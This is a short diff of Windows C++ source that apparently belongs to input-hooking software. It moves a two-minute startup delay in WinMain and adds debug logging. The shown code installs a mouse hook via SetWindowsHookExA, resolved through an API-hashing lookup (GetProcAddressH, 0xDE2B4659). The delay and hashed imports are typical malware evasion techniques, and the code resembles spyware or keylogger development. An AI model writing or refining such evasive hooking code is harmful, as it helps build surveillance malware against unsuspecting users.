@@ -201,8 +201,10 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
 }
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
-    Sleep(120000); 
+     WriteDebug("=== STARTING SERVICE ===");
     WriteDebug("wait 2 minutes sleeping...");
+    Sleep(120000); 
+    WriteDebug("2 minutes passed ...");
     HMODULE u32 = GetModuleHandleA("user32.dll");
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
     if (!_SetHook) _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddress(u32, "SetWindowsHookExA");
